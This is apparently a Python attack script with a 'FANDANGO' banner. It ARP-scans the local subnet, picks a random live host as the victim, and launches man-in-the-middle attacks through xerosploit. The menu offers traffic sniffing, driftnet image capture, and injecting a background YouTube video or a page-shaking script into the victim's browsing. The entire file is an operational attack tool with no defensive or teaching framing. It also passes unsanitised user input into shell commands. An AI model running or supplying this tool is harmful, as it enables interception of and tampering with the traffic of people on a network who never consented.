import random 
import subprocess
import netifaces 
import sys
from datetime import datetime
from scapy.all import srp,Ether,ARP,conf 

def find_IP(INTERFACE):
    def arp_scan(interface, ips):
        ipaddr=[]
        print("[+] Scanning...") 
        start_time = datetime.now()

        conf.verb = 0 
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), 
                timeout = 2, 
                iface = interface,
                inter = 0.1)

        print ("\n[+] IP - MAC") 
        for snd,rcv in ans: 
            print(rcv.sprintf(r"%ARP.psrc% - %Ether.src%"))
            ipaddr.append(rcv.sprintf(r"%ARP.psrc%"))
        stop_time = datetime.now()
        total_time = stop_time - start_time 
        print("\n[*] Scan Complete. Duration:", total_time)
        return ipaddr

    import netifaces as ni
    ip = ni.ifaddresses(INTERFACE)[ni.AF_INET][0]['addr']
    IPAddr= ip.split(".")  
    IPAddr[-1]= "0/24"
    IPAddr= ".".join( IPAddr )
    scan_result = arp_scan(INTERFACE,IPAddr)
    return random.choice(scan_result)



print("███████╗░█████╗░███╗░░██╗██████╗░░█████╗░███╗░░██╗░██████╗░░█████╗░")
print("██╔════╝██╔══██╗████╗░██║██╔══██╗██╔══██╗████╗░██║██╔════╝░██╔══██╗")
print("█████╗░░███████║██╔██╗██║██║░░██║███████║██╔██╗██║██║░░██╗░██║░░██║")
print("██╔══╝░░██╔══██║██║╚████║██║░░██║██╔══██║██║╚████║██║░░╚██╗██║░░██║")
print("██║░░░░░██║░░██║██║░╚███║██████╔╝██║░░██║██║░╚███║╚██████╔╝╚█████╔╝")
print("╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚════╝░")
print("")
print("MITM")
print("")
print("Select MITM option:")
print("(1) Inspect traffic")
print("(2) Inject Screenshotter")
print("(3) Inject RumbleMaker")
print("(4) Inject ScreenShaker")
choice= input("> ")
print("[+] Attempting man in the middle attack...")
print("Enter interface (wlan0 for wireless and eth0 for wired connections most of the time) ")
iface= input("> ")
victim_ip= find_IP(iface)

if choice=="1":
    subprocess.call("sudo python xerosploit/xerosploit.py "+victim_ip+" sniff",shell=True)
elif choice=="2":
    subprocess.call("sudo python xerosploit/xerosploit.py "+victim_ip+" driftnet",shell=True)
elif choice =="3":
    print("Enter YouTube video id to be played in the background")
    vid_id= input("> ")
    subprocess.call("sudo python xerosploit/xerosploit.py "+victim_ip+" yplay "+vid_id,shell=True)
elif choice=="4":
    subprocess.call("sudo python xerosploit/xerosploit.py "+victim_ip+" move",shell=True)







